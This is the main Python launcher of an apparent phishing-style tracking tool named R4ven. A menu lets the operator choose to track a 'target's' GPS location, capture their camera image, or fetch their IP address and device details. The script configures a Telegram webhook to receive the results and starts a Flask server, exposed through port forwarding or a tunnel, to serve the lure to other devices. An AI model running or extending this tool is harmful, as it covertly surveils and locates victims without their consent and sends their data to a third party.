#!/usr/bin/env python3
# r4ven.py
import os
import sys
import threading
import logging

# Import utilities and port-forwarding functions
from utils import get_file_data, check_and_get_webhook_url
from banner import print_banners
from port_forward import (
    run_tunnel,
    start_port_forwarding,
    ask_port_forwarding,
    shutdown_flag,
    run_flask,
    args,
    is_port_available
)

# ----------------------------------------
# Logging
# ----------------------------------------
log_file = "r4ven.log"
logging.basicConfig(filename=log_file, level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ----------------------------------------
# Colors (only if interactive terminal)
# ----------------------------------------
if sys.stdout.isatty():
    R = '\033[31m'  # Red
    G = '\033[32m'  # Green
    C = '\033[36m'  # Cyan
    W = '\033[0m'   # Reset
    Y = '\033[33m'  # Yellow
    M = '\033[35m'  # Magenta
    B = '\033[34m'  # Blue
else:
    R = G = C = W = Y = M = B = ''

# ----------------------------------------
# Menu
# ----------------------------------------
def get_user_choice():
    print(f"{B}[~] {C}Que souhaites-tu faire ?{W}\n")
    print(f"{Y}1. {W}Track Target GPS Location")
    print(f"{Y}2. {W}Capture Target Image")
    print(f"{Y}3. {W}Fetch Target IP Address")
    print(f"{Y}4. {W}All Of It")
    print(f"\n{M}Note: {W}IP address & Device details available in all the options")
    choice = input(f"\n{B}[+] {Y}Enter the number corresponding to your choice: {W}").strip()
    return choice

# ----------------------------------------
# Main
# ----------------------------------------
def main():
    print_banners()

    log_file_path = os.path.abspath(log_file)
    print(f"{B}[+] {Y}Logs :{W} {log_file_path}\n")

    # Check port availability
    if not is_port_available(args.port):
        print(f"{R}[!] Port {args.port} is already in use. Please select another port.{W}")
        logger.error("Port %s is in use. Exiting.", args.port)
        sys.exit(1)

    print('____________________________________________________________________________\n')

    choice = get_user_choice()

    if choice not in ['1', '2', '3', '4']:
        print(f"{R}Invalid choice. Exiting.{W}")
        logger.error("Invalid menu choice: %s", choice)
        sys.exit(1)

    if choice == '1':
        folder_name = 'gps'
    elif choice == '2':
        folder_name = 'cam'
    elif choice == '3':
        folder_name = 'ip'
    else:
        folder_name = 'all'

    # Ensure Telegram config exists for selected folder (creates telegram_config.json if missing)
    try:
        check_and_get_webhook_url(folder_name)
    except Exception as e:
        print(f"{R}[!] Error while checking/creating Telegram config: {e}{W}")
        logger.exception("Error in check_and_get_webhook_url for folder %s", folder_name)
        sys.exit(1)

    # Ask for port forwarding method
    port_forwarding_choice = ask_port_forwarding()
    if port_forwarding_choice == '1':
        port_forwarding_thread = threading.Thread(target=start_port_forwarding)
        port_forwarding_thread.daemon = True
        port_forwarding_thread.start()
    elif port_forwarding_choice == '2':
        threading.Thread(target=run_tunnel, daemon=True).start()
    else:
        print(f"\n{Y}Warning:{W} Port forwarding is necessary for the application to work on other devices.")
        print(f"{Y}Ensure you set it up using another method like Ngrok, Cloudflare, etc.{W}")
        logger.info("User opted for manual port forwarding.")

    # Start Flask server
    start_message = f"{G}[+] {C}Flask server started! Running on {W}http://127.0.0.1:{args.port}/{W}"
    print(f"\n{start_message}\n")
    logger.info("Flask server starting on port %s", args.port)

    run_flask(folder_name)

if __name__ == "__main__":
    main()
